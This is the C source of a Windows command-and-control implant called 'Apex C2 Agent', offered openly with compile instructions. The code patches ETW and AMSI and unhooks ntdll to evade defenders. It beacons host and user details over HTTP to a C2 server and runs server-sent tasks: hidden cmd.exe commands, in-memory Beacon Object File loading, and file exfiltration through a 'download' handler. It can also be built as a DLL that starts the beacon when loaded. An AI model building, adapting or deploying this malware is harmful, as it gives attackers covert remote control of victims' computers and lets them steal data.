/*
 * Apex C2 Agent - Windows implant with evasion, BOF loading, encrypted comms
 * Compile: x86_64-w64-mingw32-gcc -O2 -o agent.exe main.c -lwinhttp -lws2_32 -lbcrypt -static-libgcc
 */
#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8080
#endif
#ifndef USE_HTTPS
#define USE_HTTPS 0
#endif

/* ── Evasion options (toggled by builder via -D flags) ─── */
#ifndef ENABLE_ETW_PATCH
#define ENABLE_ETW_PATCH 1
#endif
#ifndef ENABLE_AMSI_PATCH
#define ENABLE_AMSI_PATCH 1
#endif
#ifndef ENABLE_SLEEP_ENCRYPT
#define ENABLE_SLEEP_ENCRYPT 1
#endif
#ifndef ENABLE_UNHOOK
#define ENABLE_UNHOOK 1
#endif

#define BUF_SIZE 65536

/* Include agent modules */
#include "evasion.h"
#include "bof.h"
#include "crypto.h"

/* ── Runtime-configurable sleep (server can change via 'sleep' command) */
static int g_sleep_ms   = 5000;
static int g_jitter_pct = 20;
static char g_agent_id[128] = {0};

/* ── Helpers ─────────────────────────────────────────────── */

static void get_hostname(char *buf, size_t len) {
    DWORD n = (DWORD)len;
    if (GetComputerNameA(buf, &n)) return;
    strncpy(buf, "unknown", len-1); buf[len-1] = '\0';
}
static void get_username(char *buf, size_t len) {
    DWORD n = (DWORD)len;
    if (GetUserNameA(buf, &n)) return;
    strncpy(buf, "unknown", len-1); buf[len-1] = '\0';
}
static void get_internal_ip(char *buf, size_t len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; return; }
    char name[256];
    if (gethostname(name, sizeof(name)) != 0) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; WSACleanup(); return; }
    struct hostent *he = gethostbyname(name);
    if (!he || !he->h_addr_list[0]) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; WSACleanup(); return; }
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    snprintf(buf, len, "%s", inet_ntoa(addr));
    WSACleanup();
}
static int get_pid(void) { return (int)GetCurrentProcessId(); }
static void get_process_name(char *buf, size_t len) {
    if (GetModuleFileNameA(NULL, buf, (DWORD)len)) return;
    strncpy(buf, "agent.exe", len-1); buf[len-1] = '\0';
}

/* ── Base64 ──────────────────────────────────────────────── */

static void b64_encode(const unsigned char *in, size_t len, char *out) {
    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i, j = 0;
    for (i = 0; i < len; i += 3) {
        unsigned long v = in[i] << 16;
        if (i+1 < len) v |= in[i+1] << 8;
        if (i+2 < len) v |= in[i+2];
        out[j++] = T[(v>>18)&0x3F]; out[j++] = T[(v>>12)&0x3F];
        out[j++] = (i+1 < len) ? T[(v>>6)&0x3F] : '=';
        out[j++] = (i+2 < len) ? T[v&0x3F] : '=';
    }
    out[j] = '\0';
}
static int b64_decode(const char *in, unsigned char *out, size_t out_len) {
    static const int D[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,['I']=8,['J']=9,
        ['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,['S']=18,['T']=19,
        ['U']=20,['V']=21,['W']=22,['X']=23,['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,['i']=34,['j']=35,
        ['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,
        ['u']=46,['v']=47,['w']=48,['x']=49,['y']=50,['z']=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
        ['8']=60,['9']=61,['+']=62,['/']=63
    };
    size_t slen = strlen(in), i, j = 0;
    for (i = 0; i < slen && in[i] != '=' && j < out_len; i += 4) {
        int a = D[(unsigned char)in[i]], b = (i+1<slen) ? D[(unsigned char)in[i+1]] : -1;
        if (b < 0) break;
        out[j++] = (unsigned char)((a<<2)|(b>>4));
        if (i+2<slen && in[i+2] != '=' && j < out_len) {
            int c = D[(unsigned char)in[i+2]]; out[j++] = (unsigned char)(((b&15)<<4)|(c>>2));
            if (i+3<slen && in[i+3] != '=' && j < out_len) {
                int d = D[(unsigned char)in[i+3]]; out[j++] = (unsigned char)(((c&3)<<6)|d);
            }
        }
    }
    return (int)j;
}

/* ── JSON helpers ────────────────────────────────────────── */

static void json_escape(const char *s, char *out, size_t out_len) {
    size_t j = 0;
    out[j++] = '"';
    while (*s && j < out_len - 4) {
        if (*s == '\\' || *s == '"') out[j++] = '\\';
        out[j++] = *s++;
    }
    out[j++] = '"'; out[j] = '\0';
}

static int json_get_string(const char *json, const char *key, char *out, size_t out_len) {
    const char *p = strstr(json, key);
    if (!p) return -1;
    p += strlen(key);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (*p != '"') return -1;
    p++;
    const char *end = strchr(p, '"');
    if (!end) return -1;
    size_t n = (size_t)(end - p);
    if (n >= out_len) n = out_len - 1;
    memcpy(out, p, n); out[n] = '\0';
    return 0;
}

/* ── Narrow → Wide (no swprintf needed) ──────────────────── */

static void ascii_to_wide(const char *src, WCHAR *dst, size_t dst_len) {
    size_t i;
    for (i = 0; src[i] && i < dst_len - 1; i++) dst[i] = (WCHAR)(unsigned char)src[i];
    dst[i] = 0;
}

/* ── Command Execution ───────────────────────────────────── */

static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
    (void)out_b64_len;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    STARTUPINFOA si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
    }
    CloseHandle(hWrite);
    char raw[BUF_SIZE]; DWORD n, total = 0;
    while (ReadFile(hRead, raw+total, sizeof(raw)-total-1, &n, NULL) && n > 0) {
        total += n; if (total >= sizeof(raw)-1) break;
    }
    raw[total] = '\0'; CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    while (total > 0 && (raw[total-1]=='\r' || raw[total-1]=='\n')) raw[--total] = '\0';
    b64_encode((unsigned char*)raw, total, out_b64);
    return 0;
}

/* ── HTTP POST ───────────────────────────────────────────── */

static int http_post(const char *host, int port, int use_https, const char *path,
                     const char *body, size_t body_len, const char *agent_id,
                     char *resp, size_t resp_len)
{
    resp[0] = '\0';
    WCHAR whost[256]; ascii_to_wide(host, whost, 256);
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return -1;
    HINTERNET hConn = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return -1; }
    WCHAR wpath[512]; ascii_to_wide(path, wpath, 512);
    DWORD flags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", wpath, NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1; }

    char hdr_narrow[512];
    if (agent_id && agent_id[0])
        snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\nX-Agent-ID: %s\r\n", agent_id);
    else
        snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\n");
    WCHAR hdr_wide[512]; ascii_to_wide(hdr_narrow, hdr_wide, 512);

    if (!WinHttpSendRequest(hReq, hdr_wide, (DWORD)-1L, (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
    }
    if (!WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
    }
    DWORD status = 0, sl = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE|WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &sl, NULL);
    DWORD nread; size_t total = 0;
    while (WinHttpReadData(hReq, resp+total, (DWORD)(resp_len-total-1), &nread) && nread > 0) {
        total += nread; if (total >= resp_len-1) break;
    }
    resp[total] = '\0';
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
    return (status >= 200 && status < 300) ? 0 : -1;
}

/* ── Built-in command handlers ───────────────────────────── */

/* Handle 'sleep' command: change beacon interval.
   Args: "<seconds> [jitter%]" */
static void handle_sleep_cmd(const char *args, char *out_b64) {
    int sec = 0, jit = -1;
    if (args && args[0]) {
        sec = atoi(args);
        const char *sp = strchr(args, ' ');
        if (sp) jit = atoi(sp + 1);
    }
    if (sec > 0) g_sleep_ms = sec * 1000;
    if (jit >= 0 && jit <= 100) g_jitter_pct = jit;

    char msg[256];
    snprintf(msg, sizeof(msg), "Sleep set to %dms (jitter %d%%)", g_sleep_ms, g_jitter_pct);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* Handle 'whoami' */
static void handle_whoami(char *out_b64) {
    char buf[512], user[128], host[128];
    get_username(user, sizeof(user));
    get_hostname(host, sizeof(host));
    BOOL admin = BeaconIsAdmin();
    snprintf(buf, sizeof(buf), "%s\\%s%s", host, user, admin ? " [ADMIN]" : "");
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'ps' - process listing */
static void handle_ps(char *out_b64) {
    char buf[BUF_SIZE]; size_t off = 0;
    off += snprintf(buf+off, sizeof(buf)-off, "%-8s %-8s %s\n", "PID", "PPID", "Name");
    off += snprintf(buf+off, sizeof(buf)-off, "%-8s %-8s %s\n", "---", "----", "----");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                off += snprintf(buf+off, sizeof(buf)-off, "%-8lu %-8lu %s\n",
                                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
                if (off >= sizeof(buf) - 128) break;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    b64_encode((unsigned char*)buf, off, out_b64);
}

/* Handle 'pwd' */
static void handle_pwd(char *out_b64) {
    char buf[MAX_PATH];
    GetCurrentDirectoryA(sizeof(buf), buf);
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'cd' */
static void handle_cd(const char *path, char *out_b64) {
    if (SetCurrentDirectoryA(path)) {
        char buf[MAX_PATH];
        GetCurrentDirectoryA(sizeof(buf), buf);
        b64_encode((unsigned char*)buf, strlen(buf), out_b64);
    } else {
        const char *msg = "Failed to change directory";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
    }
}

/* Handle 'bof' - execute Beacon Object File.
   Args are base64-encoded: <bof_b64> [args_b64] */
static void handle_bof(const char *args, char *out_b64) {
    if (!args || !args[0]) {
        const char *msg = "Usage: bof <base64_obj> [base64_args]";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    /* Split: first token is BOF base64, second (optional) is args base64 */
    char bof_b64[BUF_SIZE], bof_args_b64[BUF_SIZE];
    bof_b64[0] = bof_args_b64[0] = '\0';
    const char *sp = strchr(args, ' ');
    if (sp) {
        size_t len1 = (size_t)(sp - args);
        if (len1 >= sizeof(bof_b64)) len1 = sizeof(bof_b64) - 1;
        memcpy(bof_b64, args, len1); bof_b64[len1] = '\0';
        strncpy(bof_args_b64, sp + 1, sizeof(bof_args_b64) - 1);
    } else {
        strncpy(bof_b64, args, sizeof(bof_b64) - 1);
    }

    /* Decode BOF */
    unsigned char *bof_data = (unsigned char*)malloc(BUF_SIZE);
    if (!bof_data) { b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
    int bof_len = b64_decode(bof_b64, bof_data, BUF_SIZE);
    if (bof_len <= 0) { free(bof_data); b64_encode((unsigned char*)"invalid BOF data", 16, out_b64); return; }

    /* Decode args */
    unsigned char *bof_args = NULL;
    int args_len = 0;
    if (bof_args_b64[0]) {
        bof_args = (unsigned char*)malloc(BUF_SIZE);
        if (bof_args) args_len = b64_decode(bof_args_b64, bof_args, BUF_SIZE);
    }

    /* Execute BOF */
    char bof_output[BUF_SIZE]; DWORD bof_out_len = 0;
    bof_exec(bof_data, (size_t)bof_len, bof_args, (size_t)args_len,
             bof_output, sizeof(bof_output), &bof_out_len);

    if (bof_out_len > 0)
        b64_encode((unsigned char*)bof_output, bof_out_len, out_b64);
    else
        b64_encode((unsigned char*)"[BOF executed, no output]", 25, out_b64);

    free(bof_data);
    if (bof_args) free(bof_args);
}

/* Handle 'getuid' */
static void handle_getuid(char *out_b64) {
    char buf[256], user[128];
    get_username(user, sizeof(user));
    snprintf(buf, sizeof(buf), "%s (PID: %d, Admin: %s)",
             user, get_pid(), BeaconIsAdmin() ? "Yes" : "No");
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'download' - read file and return contents */
static void handle_download(const char *path, char *out_b64) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char msg[256]; snprintf(msg, sizeof(msg), "Cannot open: %s", path);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64); return;
    }
    DWORD sz = GetFileSize(hFile, NULL);
    if (sz > BUF_SIZE - 1) sz = BUF_SIZE - 1;
    char *buf = (char*)malloc(sz + 1);
    if (!buf) { CloseHandle(hFile); b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
    DWORD nread;
    ReadFile(hFile, buf, sz, &nread, NULL);
    CloseHandle(hFile);
    b64_encode((unsigned char*)buf, nread, out_b64);
    free(buf);
}

/* ── Beacon Loop ─────────────────────────────────────────── */

static DWORD WINAPI run_beacon(LPVOID unused) {
    (void)unused;
    const char *host = C2_HOST;
    const char *path = "/";
    int port = C2_PORT;
    int use_https = USE_HTTPS;

    /* ── Evasion at startup ── */
#if ENABLE_UNHOOK
    unhook_ntdll();
#endif
#if ENABLE_ETW_PATCH
    patch_etw();
#endif
#if ENABLE_AMSI_PATCH
    patch_amsi();
#endif

    char hostname[64], username[64], internal_ip[64], process_name[MAX_PATH];
    get_hostname(hostname, sizeof(hostname));
    get_username(username, sizeof(username));
    get_internal_ip(internal_ip, sizeof(internal_ip));
    get_process_name(process_name, sizeof(process_name));

    srand((unsigned)GetTickCount() ^ GetCurrentProcessId());

    char body[BUF_SIZE], resp[BUF_SIZE];
    char task_id[128], task_cmd[256], task_args_b64[BUF_SIZE], args_decoded[BUF_SIZE];

    for (;;) {
        /* ── Build request body ── */
        if (!g_agent_id[0]) {
            char he[128], ue[128], ie[128], pe[512];
            json_escape(hostname, he, sizeof(he));
            json_escape(username, ue, sizeof(ue));
            json_escape(internal_ip, ie, sizeof(ie));
            json_escape(process_name, pe, sizeof(pe));
            snprintf(body, sizeof(body),
                "{\"sysinfo\":{\"hostname\":%s,\"username\":%s,\"os\":\"Windows\",\"arch\":\"amd64\","
                "\"pid\":%d,\"process_name\":%s,\"internal_ip\":%s,\"sleep\":%d,\"jitter\":%d}}",
                he, ue, get_pid(), pe, ie, g_sleep_ms / 1000, g_jitter_pct);
        } else {
            snprintf(body, sizeof(body), "{}");
        }

        /* ── Send ── */
        if (http_post(host, port, use_https, path, body, strlen(body),
                      g_agent_id[0] ? g_agent_id : NULL, resp, sizeof(resp)) != 0)
            goto do_sleep;

        /* ── First time: parse agent_id ── */
        if (!g_agent_id[0]) {
            json_get_string(resp, "\"agent_id\"", g_agent_id, sizeof(g_agent_id));
            goto do_sleep;
        }

        /* ── Process task from response ── */
        task_id[0] = task_cmd[0] = task_args_b64[0] = args_decoded[0] = '\0';
        if (json_get_string(resp, "\"id\"", task_id, sizeof(task_id)) != 0)
            goto do_sleep;
        json_get_string(resp, "\"command\"", task_cmd, sizeof(task_cmd));
        json_get_string(resp, "\"arguments\"", task_args_b64, sizeof(task_args_b64));
        if (!task_cmd[0]) goto do_sleep;

        /* Decode arguments */
        if (task_args_b64[0]) {
            int alen = b64_decode(task_args_b64, (unsigned char*)args_decoded, sizeof(args_decoded)-1);
            if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
        }

        /* ── Execute task ── */
        {
            char out_b64[BUF_SIZE];
            out_b64[0] = '\0';
            int success = 1;

            /* Built-in commands */
            if (strcmp(task_cmd, "sleep") == 0) {
                handle_sleep_cmd(args_decoded, out_b64);
            } else if (strcmp(task_cmd, "whoami") == 0) {
                handle_whoami(out_b64);
            } else if (strcmp(task_cmd, "ps") == 0) {
                handle_ps(out_b64);
            } else if (strcmp(task_cmd, "pwd") == 0) {
                handle_pwd(out_b64);
            } else if (strcmp(task_cmd, "cd") == 0) {
                handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
            } else if (strcmp(task_cmd, "getuid") == 0) {
                handle_getuid(out_b64);
            } else if (strcmp(task_cmd, "bof") == 0) {
                handle_bof(args_decoded, out_b64);
            } else if (strcmp(task_cmd, "download") == 0) {
                handle_download(args_decoded, out_b64);
            } else if (strcmp(task_cmd, "exit") == 0) {
                b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}]}",
                         task_id, out_b64);
                http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
                ExitProcess(0);
            } else {
                /* Shell command via cmd.exe */
                char cmdline[4096] = "";
                if (strcmp(task_cmd, "exec") == 0 || strcmp(task_cmd, "shell") == 0) {
                    if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                } else {
                    snprintf(cmdline, sizeof(cmdline), "%s%s%s",
                             task_cmd, args_decoded[0] ? " " : "", args_decoded);
                }
                if (cmdline[0]) {
                    success = (exec_cmd(cmdline, out_b64, sizeof(out_b64)) == 0);
                } else {
                    const char *msg = "Empty command";
                    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
                    success = 0;
                }
            }

            /* Send result */
            snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}]}",
                     task_id, out_b64, success ? "true" : "false");
            http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
        }

do_sleep:
        {
            int s = g_sleep_ms;
            if (g_jitter_pct > 0) {
                int j = (s * g_jitter_pct) / 100;
                if (j > 0) s += (rand() % (2*j+1)) - j;
            }
            if (s < 500) s = 500;

#if ENABLE_SLEEP_ENCRYPT
            if (g_agent_id[0]) /* only encrypt sleep after registration */
                encrypted_sleep((DWORD)s);
            else
                Sleep((DWORD)s);
#else
            Sleep((DWORD)s);
#endif
        }
    }
    return 0;
}

/* ── Entry point ─────────────────────────────────────────── */

#ifdef BUILD_DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    (void)lpReserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, run_beacon, NULL, 0, NULL);
    }
    return TRUE;
}
#else
int main(void) {
    run_beacon(NULL);
    return 0;
}
#endif
